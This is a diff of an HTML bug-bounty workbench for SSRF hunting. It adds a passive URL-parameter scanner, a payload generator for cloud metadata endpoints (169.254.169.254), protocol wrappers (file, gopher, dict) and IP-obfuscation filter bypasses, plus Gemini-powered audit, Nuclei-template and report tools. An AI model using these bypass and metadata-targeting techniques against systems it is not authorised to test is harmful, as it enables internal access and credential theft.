@@ -3,21 +3,27 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SSRF Recon & Planning Workbench</title>
+    <title>SSRF Recon & Planning Workbench v3.0</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap');
         
         body {
             font-family: 'Inter', sans-serif;
             background-color: #fafaf9; /* Stone-50 */
             color: #1c1917; /* Stone-900 */
         }
+        
+        pre, code, textarea.mono {
+            font-family: 'JetBrains Mono', monospace;
+        }
 
         /* Custom Scrollbar */
         ::-webkit-scrollbar {
             width: 8px;
+            height: 8px;
         }
         ::-webkit-scrollbar-track {
             background: #e7e5e4; 
@@ -30,18 +36,16 @@
             background: #78716c; 
         }
 
-        /* Chart Container Strict Styling */
         .chart-container {
             position: relative;
             width: 100%;
-            max-width: 100%;
-            height: 300px;
+            height: 250px;
             margin: 0 auto;
         }
         
         @media (min-width: 768px) {
             .chart-container {
-                height: 350px;
+                height: 300px;
             }
         }
 
@@ -51,19 +55,13 @@
             font-weight: 600;
         }
 
-        .tab-btn.active {
-            border-bottom: 2px solid #ea580c;
-            color: #ea580c;
-        }
-
-        /* Loading Spinner */
         .loader {
-            border: 3px solid #f3f3f3;
+            border: 3px solid rgba(255,255,255,0.3);
             border-radius: 50%;
-            border-top: 3px solid #ea580c;
-            width: 20px;
-            height: 20px;
-            -webkit-animation: spin 1s linear infinite; /* Safari */
+            border-top: 3px solid #ffffff;
+            width: 16px;
+            height: 16px;
+            -webkit-animation: spin 1s linear infinite;
             animation: spin 1s linear infinite;
         }
         @keyframes spin {
@@ -71,584 +69,510 @@
             100% { transform: rotate(360deg); }
         }
 
-        /* Utility for transitions */
-        .transition-all-300 {
-            transition: all 0.3s ease-in-out;
-        }
+        /* Markdown Styles */
+        .markdown-body h1, .markdown-body h2 { font-weight: bold; color: #fff; margin-bottom: 0.5em; }
+        .markdown-body code { background-color: #333; padding: 2px 4px; border-radius: 3px; }
+        .markdown-body pre { background-color: #222; padding: 10px; border-radius: 5px; overflow-x: auto; margin-bottom: 10px; }
     </style>
-    <!-- Chosen Palette: Warm Neutrals (Stone) with Burnt Orange Accents. Minimalistic, professional, and data-focused. -->
-    <!-- Application Structure Plan: 
-         1. Dashboard Overview: High-level metrics on SSRF entry points and impact to set context.
-         2. Payload Constructor: Interactive tool to generate specific SSRF test strings based on cloud provider/scenario.
-         3. AI Operations: Gemini-powered tools for report drafting and advanced payload brainstorming.
-         4. Methodology Guide: A tabbed interface guiding the user through Discovery, Blind SSRF, and Bypassing filters.
-         5. Defense Analyst: A section for mitigation strategies, vital for writing high-quality reports.
-    -->
-    <!-- Visualization & Content Choices:
-         1. Bar Chart (Entry Points): Shows frequency of vulnerability locations.
-         2. Doughnut Chart (Impact): Shows severity distribution.
-         3. Interactive Inputs (Payloads/AI): Dropdowns, text areas, and Gemini API integration.
-         4. Tabs (Methodology): Segments complex workflows.
+    <!-- 
+    Updated Features:
+    - Added "Passive Scanner" section.
+    - Preserved AI Operations (Code Auditor, Report, Templates).
+    - Preserved Payload Factory.
     -->
     <!-- CONFIRMATION: NO SVG graphics used. NO Mermaid JS used. -->
 </head>
-<body class="flex flex-col md:flex-row min-h-screen">
+<body class="flex flex-col md:flex-row min-h-screen h-screen overflow-hidden">
 
     <!-- Sidebar Navigation -->
-    <aside class="w-full md:w-64 bg-stone-100 border-r border-stone-200 flex-shrink-0 sticky top-0 md:h-screen overflow-y-auto z-20">
-        <div class="p-6 border-b border-stone-200">
-            <h1 class="text-xl font-bold text-stone-800 tracking-tight">SSRF<span class="text-orange-600">.Hunter</span></h1>
-            <p class="text-xs text-stone-500 mt-1">Recon & Analysis Workbench</p>
+    <aside class="w-full md:w-64 bg-stone-100 border-r border-stone-200 flex-shrink-0 flex flex-col z-20 md:h-full">
+        <div class="p-6 border-b border-stone-200 bg-stone-50">
+            <h1 class="text-xl font-bold text-stone-800 tracking-tight flex items-center gap-2">
+                <span>⚡</span> SSRF<span class="text-orange-600">.Hunter</span>
+            </h1>
+            <p class="text-xs text-stone-500 mt-1 font-mono">v3.0 // Recon Workbench</p>
         </div>
-        <nav class="mt-4">
-            <ul>
-                <li><button onclick="navigateTo('dashboard')" id="nav-dashboard" class="nav-item w-full text-left px-6 py-3 text-stone-600 hover:bg-stone-200 transition-colors active">📊 Dashboard Overview</button></li>
-                <li><button onclick="navigateTo('payloads')" id="nav-payloads" class="nav-item w-full text-left px-6 py-3 text-stone-600 hover:bg-stone-200 transition-colors">🛠️ Payload Constructor</button></li>
-                <li><button onclick="navigateTo('ai-ops')" id="nav-ai-ops" class="nav-item w-full text-left px-6 py-3 text-stone-800 hover:bg-orange-50 transition-colors font-medium border-l-4 border-transparent hover:border-orange-300">✨ AI Operations</button></li>
-                <li><button onclick="navigateTo('methodology')" id="nav-methodology" class="nav-item w-full text-left px-6 py-3 text-stone-600 hover:bg-stone-200 transition-colors">🔍 Methodology & Discovery</button></li>
-                <li><button onclick="navigateTo('mitigation')" id="nav-mitigation" class="nav-item w-full text-left px-6 py-3 text-stone-600 hover:bg-stone-200 transition-colors">🛡️ Mitigation Strategies</button></li>
-            </ul>
+        
+        <nav class="flex-1 overflow-y-auto py-4 space-y-1">
+            <button onclick="navigateTo('dashboard')" id="nav-dashboard" class="nav-item w-full text-left px-6 py-3 text-stone-600 hover:bg-stone-200 transition-colors active text-sm">
+                📊 Dashboard & Notes
+            </button>
+            <button onclick="navigateTo('passive-scanner')" id="nav-passive-scanner" class="nav-item w-full text-left px-6 py-3 text-stone-800 hover:bg-orange-50 transition-colors text-sm font-semibold border-l-4 border-transparent hover:border-orange-300">
+                📡 Passive Scanner <span class="text-[10px] bg-orange-200 text-orange-800 px-1 rounded ml-1">NEW</span>
+            </button>
+            <button onclick="navigateTo('payloads')" id="nav-payloads" class="nav-item w-full text-left px-6 py-3 text-stone-600 hover:bg-stone-200 transition-colors text-sm">
+                🛠️ Payload Factory
+            </button>
+            
+            <div class="px-6 py-2 mt-2 text-xs font-bold text-stone-400 uppercase tracking-wider">AI Operations</div>
+            
+            <button onclick="navigateTo('ai-auditor')" id="nav-ai-auditor" class="nav-item w-full text-left px-6 py-2 text-stone-600 hover:bg-orange-50 transition-colors text-sm border-l-4 border-transparent hover:border-orange-300">
+                🔍 Code Auditor
+            </button>
+            <button onclick="navigateTo('ai-templates')" id="nav-ai-templates" class="nav-item w-full text-left px-6 py-2 text-stone-600 hover:bg-orange-50 transition-colors text-sm border-l-4 border-transparent hover:border-orange-300">
+                📝 Template Gen (Nuclei)
+            </button>
+            <button onclick="navigateTo('ai-report')" id="nav-ai-report" class="nav-item w-full text-left px-6 py-2 text-stone-600 hover:bg-orange-50 transition-colors text-sm border-l-4 border-transparent hover:border-orange-300">
+                📄 Report Drafter
+            </button>
         </nav>
-        <div class="p-6 mt-auto">
-            <div class="bg-orange-50 border border-orange-100 p-3 rounded-lg">
-                <h4 class="text-xs font-bold text-orange-800 uppercase mb-1">Current Target</h4>
-                <input type="text" placeholder="e.g., target-api.com" class="w-full bg-white border border-orange-200 rounded px-2 py-1 text-xs focus:outline-none focus:border-orange-500">
-            </div>
-        </div>
     </aside>
 
     <!-- Main Content Area -->
-    <main class="flex-1 overflow-y-auto p-4 md:p-8 bg-stone-50">
+    <main class="flex-1 overflow-y-auto p-4 md:p-8 bg-stone-50 scroll-smooth relative">
         
-        <!-- Section: Dashboard Overview -->
-        <section id="dashboard" class="space-y-6">
-            <div class="mb-8">
-                <h2 class="text-2xl font-bold text-stone-800">SSRF Landscape Analysis</h2>
-                <p class="text-stone-600 mt-2 max-w-3xl">
-                    Server-Side Request Forgery (SSRF) remains a critical vulnerability in modern cloud-native applications. 
-                    This dashboard synthesizes key data points regarding entry vectors and impact severity to help prioritize your hunting efforts.
-                </p>
-            </div>
+        <!-- SECTION: Dashboard -->
+        <section id="dashboard" class="space-y-6 animate-fade-in">
+            <div class="flex flex-col lg:flex-row gap-6">
+                <!-- Left Col: Stats -->
+                <div class="flex-1 space-y-6">
+                    <div class="bg-white p-6 rounded-xl shadow-sm border border-stone-200">
+                        <h2 class="text-lg font-bold text-stone-800 mb-1">Recon Status</h2>
+                        <div class="space-y-2" id="checklist-container"></div>
+                        <div class="mt-4 pt-4 border-t border-stone-100 flex justify-between items-center">
+                            <span class="text-xs text-stone-400" id="progress-text">0/5 Completed</span>
+                            <button onclick="resetChecklist()" class="text-xs text-orange-600 hover:text-orange-800 font-medium">Reset</button>
+                        </div>
+                    </div>
 
-            <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
-                <!-- Card 1: Entry Points Chart -->
-                <div class="bg-white p-6 rounded-xl shadow-sm border border-stone-200">
-                    <h3 class="text-lg font-semibold text-stone-800 mb-4">Most Common Injection Vectors</h3>
-                    <div class="chart-container">
-                        <canvas id="entryPointsChart"></canvas>
+                    <div class="bg-white p-6 rounded-xl shadow-sm border border-stone-200">
+                        <h3 class="text-sm font-bold text-stone-800 mb-4">Attack Surface Analysis</h3>
+                        <div class="chart-container">
+                            <canvas id="entryPointsChart"></canvas>
+                        </div>
                     </div>
                 </div>
 
-                <!-- Card 2: Impact Analysis -->
-                <div class="bg-white p-6 rounded-xl shadow-sm border border-stone-200">
-                    <h3 class="text-lg font-semibold text-stone-800 mb-4">Potential Impact Severity</h3>
-                    <div class="chart-container">
-                        <canvas id="impactChart"></canvas>
+                <!-- Right Col: Persistent Notepad -->
+                <div class="w-full lg:w-96 flex flex-col bg-white rounded-xl shadow-sm border border-stone-200 overflow-hidden h-[600px]">
+                    <div class="p-4 border-b border-stone-200 bg-stone-100 flex justify-between items-center">
+                        <h3 class="font-bold text-stone-700 text-sm">📝 Session Scratchpad</h3>
+                        <span class="text-[10px] text-stone-400 uppercase tracking-wide" id="save-status">Auto-saved</span>
                     </div>
-                </div>
-            </div>
-
-            <!-- Quick Stats Row -->
-            <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
-                <div class="bg-stone-800 text-white p-5 rounded-lg shadow-sm">
-                    <div class="text-2xl font-bold">169.254.x.x</div>
-                    <div class="text-sm text-stone-400 mt-1">Cloud Metadata Target</div>
-                </div>
-                <div class="bg-stone-100 text-stone-800 p-5 rounded-lg border border-stone-200">
-                    <div class="text-2xl font-bold">Blind SSRF</div>
-                    <div class="text-sm text-stone-500 mt-1">Requires OOB Interaction</div>
-                </div>
-                <div class="bg-stone-100 text-stone-800 p-5 rounded-lg border border-stone-200">
-                    <div class="text-2xl font-bold">PDF & Images</div>
-                    <div class="text-sm text-stone-500 mt-1">High-Risk Features</div>
+                    <textarea id="scratchpad" class="flex-1 w-full p-4 resize-none focus:outline-none font-mono text-xs leading-relaxed text-stone-700 bg-yellow-50/20" placeholder="// Paste URLs, IPs, or findings here."></textarea>
+                    <div class="p-2 border-t border-stone-200 bg-stone-50 text-right">
+                        <button onclick="downloadNotes()" class="text-xs bg-stone-200 hover:bg-stone-300 text-stone-700 px-2 py-1 rounded transition">Download .txt</button>
+                    </div>
                 </div>
             </div>
         </section>
 
-        <!-- Section: Payload Constructor -->
-        <section id="payloads" class="hidden space-y-6">
-            <div class="mb-8">
-                <h2 class="text-2xl font-bold text-stone-800">Payload Constructor</h2>
-                <p class="text-stone-600 mt-2 max-w-3xl">
-                    Generate context-specific test strings for identifying SSRF. Select your target environment and obfuscation technique below.
+        <!-- SECTION: PASSIVE SCANNER (NEW) -->
+        <section id="passive-scanner" class="hidden space-y-6 animate-fade-in">
+            <div class="mb-6">
+                <h2 class="text-2xl font-bold text-stone-800 flex items-center gap-2">
+                    📡 Passive Entry Point Scanner
+                </h2>
+                <p class="text-stone-600 mt-1 max-w-3xl text-sm">
+                    Paste a list of URLs (from Waymore, Gau, or Burp). The scanner will analyze query parameters against a database of 50+ known SSRF vectors and highlight high-probability targets.
+                    <span class="block mt-1 text-orange-600 font-semibold text-xs">Note: This is a passive analysis. No requests are sent to the target.</span>
                 </p>
             </div>
 
-            <div class="bg-white rounded-xl shadow-sm border border-stone-200 overflow-hidden">
-                <div class="grid grid-cols-1 md:grid-cols-3 border-b border-stone-200">
-                    <div class="p-6 border-r border-stone-200 bg-stone-50">
-                        <label class="block text-xs font-bold text-stone-500 uppercase mb-2">Target Environment</label>
-                        <select id="targetEnv" class="w-full bg-white border border-stone-300 rounded p-2 text-sm focus:outline-none focus:border-orange-500 mb-4">
-                            <option value="basic">Basic Localhost (127.0.0.1)</option>
-                            <option value="aws">AWS Metadata (EC2)</option>
-                            <option value="gcp">Google Cloud Metadata</option>
-                            <option value="azure">Azure Instance Metadata</option>
-                            <option value="oracle">Oracle Cloud</option>
-                            <option value="docker">Docker API</option>
-                        </select>
+            <div class="grid grid-cols-1 lg:grid-cols-2 gap-6 h-[600px]">
+                <!-- Input -->
+                <div class="flex flex-col h-full bg-white rounded-xl shadow-sm border border-stone-200">
+                    <div class="p-3 border-b border-stone-200 bg-stone-50 flex justify-between items-center">
+                        <span class="text-xs font-bold text-stone-500 uppercase">Input URLs</span>
+                        <button onclick="document.getElementById('scan-input').value=''" class="text-xs text-stone-400 hover:text-stone-600">Clear</button>
+                    </div>
+                    <textarea id="scan-input" class="flex-1 p-4 font-mono text-xs resize-none focus:outline-none text-stone-700" placeholder="https://example.com/api?webhook=...
+https://example.com/profile?img_url=...
+https://example.com/login?next=..."></textarea>
+                    <div class="p-4 border-t border-stone-200">
+                        <button onclick="runPassiveScan()" class="w-full bg-orange-600 hover:bg-orange-700 text-white py-3 rounded text-sm font-bold shadow-md shadow-orange-100 transition-all">
+                            Analyze Parameters
+                        </button>
+                    </div>
+                </div>
 
-                        <label class="block text-xs font-bold text-stone-500 uppercase mb-2">Evasion / Obfuscation</label>
-                        <select id="obfuscationType" class="w-full bg-white border border-stone-300 rounded p-2 text-sm focus:outline-none focus:border-orange-500">
-                            <option value="none">None (Plain)</option>
+                <!-- Output -->
+                <div class="flex flex-col h-full bg-white rounded-xl shadow-sm border border-stone-200 overflow-hidden">
+                    <div class="p-3 border-b border-stone-200 bg-stone-50 flex justify-between items-center">
+                        <span class="text-xs font-bold text-stone-500 uppercase">Vulnerability Candidates</span>
+                        <span id="scan-count" class="text-xs font-mono text-stone-400">0 Found</span>
+                    </div>
+                    <div id="scan-output" class="flex-1 overflow-y-auto p-0">
+                        <div class="h-full flex flex-col items-center justify-center text-stone-400 text-sm">
+                            <span>Waiting for input...</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- SECTION: Payload Factory -->
+        <section id="payloads" class="hidden space-y-6 animate-fade-in">
+             <div class="mb-6">
+                <h2 class="text-2xl font-bold text-stone-800">Advanced Payload Factory</h2>
+                <p class="text-stone-600 mt-1 max-w-3xl text-sm">
+                    Generate context-aware polyglots and bypass strings.
+                </p>
+            </div>
+
+            <div class="bg-white rounded-xl shadow-sm border border-stone-200 overflow-hidden flex flex-col lg:flex-row">
+                <!-- Controls -->
+                <div class="p-6 bg-stone-50 border-r border-stone-200 w-full lg:w-1/3 space-y-5">
+                    <div>
+                        <label class="block text-xs font-bold text-stone-500 uppercase mb-2">Target Cloud/Env</label>
+                        <select id="pf-target" class="w-full bg-white border border-stone-300 rounded p-2 text-sm focus:border-orange-500 focus:outline-none">
+                            <option value="aws">AWS (169.254.169.254)</option>
+                            <option value="gcp">Google Cloud (Metadata)</option>
+                            <option value="azure">Azure (Instance)</option>
+                            <option value="digitalocean">DigitalOcean</option>
+                            <option value="docker">Docker Socket</option>
+                            <option value="localhost">Generic Localhost</option>
+                        </select>
+                    </div>
+
+                    <div>
+                        <label class="block text-xs font-bold text-stone-500 uppercase mb-2">Protocol Wrappers</label>
+                        <div class="grid grid-cols-2 gap-2">
+                            <label class="flex items-center gap-2 p-2 border border-stone-200 rounded bg-white cursor-pointer hover:border-orange-300">
+                                <input type="checkbox" class="pf-proto" value="http" checked> <span class="text-xs">HTTP/S</span>
+                            </label>
+                            <label class="flex items-center gap-2 p-2 border border-stone-200 rounded bg-white cursor-pointer hover:border-orange-300">
+                                <input type="checkbox" class="pf-proto" value="file"> <span class="text-xs">file://</span>
+                            </label>
+                            <label class="flex items-center gap-2 p-2 border border-stone-200 rounded bg-white cursor-pointer hover:border-orange-300">
+                                <input type="checkbox" class="pf-proto" value="gopher"> <span class="text-xs">gopher://</span>
+                            </label>
+                            <label class="flex items-center gap-2 p-2 border border-stone-200 rounded bg-white cursor-pointer hover:border-orange-300">
+                                <input type="checkbox" class="pf-proto" value="dict"> <span class="text-xs">dict://</span>
+                            </label>
+                        </div>
+                    </div>
+
+                    <div>
+                        <label class="block text-xs font-bold text-stone-500 uppercase mb-2">Bypass Technique</label>
+                        <select id="pf-bypass" class="w-full bg-white border border-stone-300 rounded p-2 text-sm focus:border-orange-500 focus:outline-none">
+                            <option value="none">None (Standard)</option>
                             <option value="decimal">Decimal IP</option>
                             <option value="octal">Octal IP</option>
-                            <option value="hex">Hexadecimal IP</option>
-                            <option value="dottedhex">Dotted Hex</option>
-                            <option value="short">Short Hand (0)</option>
+                            <option value="hex">Hexadecimal</option>
+                            <option value="enclosed">Enclosed Alphanumerics (①)</option>
                         </select>
-                        
-                        <button id="generateBtn" class="w-full mt-6 bg-stone-800 hover:bg-stone-900 text-white font-semibold py-2 px-4 rounded transition-colors text-sm">
-                            Generate Payloads
-                        </button>
                     </div>
 
-                    <div class="col-span-2 p-6">
-                        <div class="flex justify-between items-center mb-2">
-                            <h4 class="font-semibold text-stone-700">Generated Reference Payloads</h4>
-                            <span class="text-xs text-stone-400">Read-only Output</span>
-                        </div>
-                        <textarea id="payloadOutput" readonly class="w-full h-64 bg-stone-900 text-green-400 font-mono text-sm p-4 rounded-lg focus:outline-none resize-none" placeholder="Select options and click Generate..."></textarea>
-                        <div class="mt-2 flex justify-end">
-                            <button onclick="copyPayloads()" class="text-xs text-stone-500 hover:text-orange-600 font-medium">📋 Copy to Clipboard</button>
-                        </div>
+                    <button onclick="generatePayloads()" class="w-full bg-stone-800 hover:bg-stone-900 text-white font-bold py-3 rounded text-sm transition-all shadow-lg shadow-stone-200">
+                        Generate Attack List
+                    </button>
+                </div>
+
+                <!-- Output -->
+                <div class="flex-1 p-6 flex flex-col bg-stone-900">
+                    <div class="flex justify-between items-center mb-2">
+                        <span class="text-xs font-mono text-stone-400">output.txt</span>
+                        <button onclick="copyToClipboard('pf-output')" class="text-xs text-orange-400 hover:text-orange-300 cursor-pointer">Copy All</button>
                     </div>
+                    <textarea id="pf-output" readonly class="flex-1 bg-transparent border-none text-green-400 font-mono text-xs resize-none focus:outline-none leading-relaxed" placeholder="// Select options and click Generate..."></textarea>
                 </div>
             </div>
         </section>
 
-        <!-- Section: AI Operations (New) -->
-        <section id="ai-ops" class="hidden space-y-6">
-            <div class="mb-8">
+        <!-- SECTION: AI Code Auditor -->
+        <section id="ai-auditor" class="hidden space-y-6 animate-fade-in">
+             <div class="flex justify-between items-end">
+                <div>
+                    <h2 class="text-2xl font-bold text-stone-800 flex items-center gap-2">
+                        🔍 AI Code Auditor
+                    </h2>
+                    <p class="text-stone-600 mt-1 max-w-2xl text-sm">
+                        Paste source code (Python, JS, Go, etc.) to detect SSRF vulnerabilities.
+                    </p>
+                </div>
+                <div class="text-right hidden md:block">
+                    <span class="inline-block px-3 py-1 bg-orange-100 text-orange-700 rounded-full text-xs font-bold">Powered by Gemini</span>
+                </div>
+            </div>
+
+            <div class="grid grid-cols-1 lg:grid-cols-2 gap-6 h-[600px]">
+                <div class="flex flex-col h-full bg-white rounded-xl shadow-sm border border-stone-200">
+                    <textarea id="audit-input" class="flex-1 p-4 font-mono text-xs resize-none focus:outline-none text-stone-700" placeholder="// Paste function or class here..."></textarea>
+                    <div class="p-4 border-t border-stone-200">
+                        <button onclick="runAudit()" id="btn-audit" class="w-full bg-stone-800 hover:bg-stone-900 text-white py-2 rounded text-sm font-medium flex justify-center items-center gap-2">
+                            <span>Analyze Code</span>
+                            <div id="loader-audit" class="loader hidden"></div>
+                        </button>
+                    </div>
+                </div>
+                <div class="flex flex-col h-full bg-stone-900 rounded-xl shadow-sm border border-stone-800 overflow-hidden">
+                    <div id="audit-output" class="flex-1 p-4 overflow-y-auto markdown-body text-stone-300 text-sm">
+                        <p class="text-stone-500 italic">Analysis results will appear here...</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+        
+        <!-- SECTION: AI Template Generator -->
+        <section id="ai-templates" class="hidden space-y-6 animate-fade-in">
+            <div class="mb-6">
                 <h2 class="text-2xl font-bold text-stone-800 flex items-center gap-2">
-                    <span class="text-orange-600">✨</span> Gemini AI Operations
+                    📝 Nuclei Template Generator
+                </h2>
+                <p class="text-stone-600 mt-1 max-w-2xl text-sm">
+                    Describe a vulnerability, and the AI will generate a ready-to-use Nuclei YAML template.
+                </p>
+            </div>
+            <div class="bg-white rounded-xl shadow-sm border border-stone-200 p-6 space-y-4">
+                <textarea id="template-desc" class="w-full h-24 bg-stone-50 border border-stone-300 rounded p-3 text-sm focus:border-orange-500 focus:outline-none resize-none" placeholder="e.g. GET /preview?url= triggers SSRF. It blocks 'localhost'. Match for 'root:x:0:0'."></textarea>
+                <div class="flex gap-4">
+                    <button onclick="genTemplate()" id="btn-nuclei" class="flex-1 bg-stone-800 hover:bg-stone-900 text-white py-2 rounded text-sm font-medium flex justify-center items-center gap-2">
+                        <span>Generate Nuclei YAML</span>
+                        <div id="loader-nuclei" class="loader hidden"></div>
+                    </button>
+                </div>
+                <textarea id="template-output" readonly class="w-full h-64 bg-stone-900 text-blue-300 font-mono text-xs p-4 rounded-lg focus:outline-none resize-none"></textarea>
+            </div>
+        </section>
+
+        <!-- SECTION: AI Report -->
+        <section id="ai-report" class="hidden space-y-6 animate-fade-in">
+             <div class="mb-8">
+                <h2 class="text-2xl font-bold text-stone-800 flex items-center gap-2">
+                    📄 Report Drafter
                 </h2>
                 <p class="text-stone-600 mt-2 max-w-3xl">
-                    Leverage Large Language Models to accelerate your bug bounty workflow. Draft professional reports instantly or brainstorm complex bypass payloads based on specific WAF behaviors.
+                    Turn rough notes into a HackerOne-ready report.
                 </p>
             </div>
-
-            <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
-                <!-- AI Feature 1: Report Drafter -->
-                <div class="bg-white rounded-xl shadow-sm border border-stone-200 flex flex-col">
-                    <div class="p-6 border-b border-stone-100 bg-stone-50 rounded-t-xl">
-                        <h3 class="text-lg font-bold text-stone-800">Report Drafter</h3>
-                        <p class="text-xs text-stone-500">Turn rough notes into a HackerOne-ready report.</p>
-                    </div>
-                    <div class="p-6 space-y-4 flex-1">
-                        <div>
-                            <label class="block text-xs font-bold text-stone-500 uppercase mb-1">Vulnerable Endpoint</label>
-                            <input type="text" id="ai-report-endpoint" placeholder="e.g. https://api.target.com/fetch?url=" class="w-full bg-white border border-stone-300 rounded p-2 text-sm focus:border-orange-500 focus:outline-none">
-                        </div>
-                        <div>
-                            <label class="block text-xs font-bold text-stone-500 uppercase mb-1">Impact / Findings</label>
-                            <textarea id="ai-report-findings" class="w-full h-24 bg-white border border-stone-300 rounded p-2 text-sm focus:border-orange-500 focus:outline-none resize-none" placeholder="e.g. Accessed AWS metadata, retrieved IAM credentials. Blind interaction confirmed via Burp Collab."></textarea>
-                        </div>
-                        <button id="btn-draft-report" class="w-full bg-stone-800 hover:bg-orange-600 text-white font-semibold py-2 px-4 rounded transition-colors text-sm flex justify-center items-center gap-2">
-                            <span>✨ Draft Report</span>
-                            <div id="loader-report" class="loader hidden"></div>
-                        </button>
-                        
-                        <div class="mt-4">
-                            <label class="block text-xs font-bold text-stone-400 uppercase mb-1">Generated Draft</label>
-                            <textarea id="ai-report-output" readonly class="w-full h-48 bg-stone-50 border border-stone-200 rounded p-3 text-xs font-mono text-stone-700 resize-none focus:outline-none"></textarea>
-                        </div>
-                    </div>
+            <div class="bg-white rounded-xl shadow-sm border border-stone-200 flex flex-col lg:flex-row h-[600px]">
+                <div class="p-6 border-r border-stone-200 w-full lg:w-1/3 flex flex-col gap-4 overflow-y-auto">
+                    <input type="text" id="ai-report-endpoint" placeholder="e.g. /fetch?url=" class="w-full bg-white border border-stone-300 rounded p-2 text-sm focus:border-orange-500 focus:outline-none">
+                    <textarea id="ai-report-findings" class="w-full h-32 bg-white border border-stone-300 rounded p-2 text-sm focus:border-orange-500 focus:outline-none resize-none" placeholder="e.g. Accessed AWS metadata."></textarea>
+                    <button id="btn-draft-report" class="w-full bg-orange-600 hover:bg-orange-700 text-white font-semibold py-2 px-4 rounded transition-colors text-sm flex justify-center items-center gap-2">
+                        <span>Draft Report</span>
+                        <div id="loader-report" class="loader hidden"></div>
+                    </button>
                 </div>
-
-                <!-- AI Feature 2: Payload Brainstormer -->
-                <div class="bg-white rounded-xl shadow-sm border border-stone-200 flex flex-col">
-                    <div class="p-6 border-b border-stone-100 bg-stone-50 rounded-t-xl">
-                        <h3 class="text-lg font-bold text-stone-800">Smart Payload Brainstormer</h3>
-                        <p class="text-xs text-stone-500">Describe the defense/stack, get custom bypass ideas.</p>
-                    </div>
-                    <div class="p-6 space-y-4 flex-1">
-                        <div>
-                            <label class="block text-xs font-bold text-stone-500 uppercase mb-1">Scenario Description</label>
-                            <textarea id="ai-payload-desc" class="w-full h-32 bg-white border border-stone-300 rounded p-2 text-sm focus:border-orange-500 focus:outline-none resize-none" placeholder="e.g. Target is a Java Spring app. It blocks 'localhost', '127.0.0.1' and redirects. I need to access an internal service on port 8080."></textarea>
-                        </div>
-                        <button id="btn-brainstorm" class="w-full bg-stone-800 hover:bg-orange-600 text-white font-semibold py-2 px-4 rounded transition-colors text-sm flex justify-center items-center gap-2">
-                            <span>✨ Suggest Payloads</span>
-                            <div id="loader-payload" class="loader hidden"></div>
-                        </button>
-
-                        <div class="mt-4">
-                            <label class="block text-xs font-bold text-stone-400 uppercase mb-1">AI Suggestions</label>
-                            <div id="ai-payload-output" class="w-full h-48 bg-stone-900 border border-stone-700 rounded p-3 text-xs font-mono text-green-400 overflow-y-auto whitespace-pre-wrap"></div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- Section: Methodology -->
-        <section id="methodology" class="hidden space-y-6">
-            <div class="mb-6">
-                <h2 class="text-2xl font-bold text-stone-800">Testing Methodology</h2>
-                <p class="text-stone-600 mt-2 max-w-3xl">
-                    A structured approach is required to reliably detect SSRF without causing system instability. 
-                    Navigate through the phases below to understand the workflow from discovery to exploitation.
-                </p>
-            </div>
-
-            <div class="bg-white rounded-xl shadow-sm border border-stone-200">
-                <!-- Tabs Header -->
-                <div class="flex border-b border-stone-200 overflow-x-auto">
-                    <button onclick="switchTab('discovery')" class="tab-btn active px-6 py-4 text-sm font-medium text-stone-600 hover:text-stone-800 focus:outline-none whitespace-nowrap">1. Discovery & Recon</button>
-                    <button onclick="switchTab('testing')" class="tab-btn px-6 py-4 text-sm font-medium text-stone-600 hover:text-stone-800 focus:outline-none whitespace-nowrap">2. In-Band vs Blind</button>
-                    <button onclick="switchTab('bypass')" class="tab-btn px-6 py-4 text-sm font-medium text-stone-600 hover:text-stone-800 focus:outline-none whitespace-nowrap">3. Bypassing Filters</button>
-                </div>
-
-                <!-- Tab Content: Discovery -->
-                <div id="tab-discovery" class="p-6 md:p-8 animate-fade">
-                    <h3 class="text-lg font-bold text-stone-800 mb-4">Identifying Potential Entry Points</h3>
-                    <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
-                        <div>
-                            <p class="text-stone-600 mb-4 text-sm leading-relaxed">
-                                SSRF usually occurs in functionality that imports data from a URL. Look for these specific features and parameter names during your manual browsing or crawling.
-                            </p>
-                            <ul class="space-y-3">
-                                <li class="flex items-center gap-3 bg-stone-50 p-3 rounded border border-stone-100">
-                                    <span class="text-orange-600 font-bold">01</span>
-                                    <span class="text-sm font-medium text-stone-700">Webhooks & Integrations</span>
-                                </li>
-                                <li class="flex items-center gap-3 bg-stone-50 p-3 rounded border border-stone-100">
-                                    <span class="text-orange-600 font-bold">02</span>
-                                    <span class="text-sm font-medium text-stone-700">File Upload via URL</span>
-                                </li>
-                                <li class="flex items-center gap-3 bg-stone-50 p-3 rounded border border-stone-100">
-                                    <span class="text-orange-600 font-bold">03</span>
-                                    <span class="text-sm font-medium text-stone-700">PDF/Image Generators</span>
-                                </li>
-                            </ul>
-                        </div>
-                        <div class="bg-stone-900 rounded-lg p-5 font-mono text-xs">
-                            <div class="text-stone-400 mb-2 border-b border-stone-700 pb-2"># Common Suspect Parameters</div>
-                            <div class="text-green-400 space-y-1">
-                                <div>?dest={url}</div>
-                                <div>?redirect={url}</div>
-                                <div>?uri={url}</div>
-                                <div>?path={url}</div>
-                                <div>?continue={url}</div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Tab Content: Testing -->
-                <div id="tab-testing" class="hidden p-6 md:p-8 animate-fade">
-                    <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
-                        <div>
-                            <h4 class="font-bold text-stone-800 mb-2">In-Band SSRF</h4>
-                            <p class="text-sm text-stone-600 mb-4">
-                                The application returns the response from the fetched URL directly to you.
-                            </p>
-                            <div class="bg-stone-100 p-4 rounded border-l-4 border-green-500">
-                                <p class="text-xs font-mono text-stone-700">
-                                    <strong>Request:</strong> POST /stock?api=http://localhost/admin<br>
-                                    <strong>Response:</strong> 200 OK "Welcome to Admin Panel"
-                                </p>
-                            </div>
-                        </div>
-                        <div>
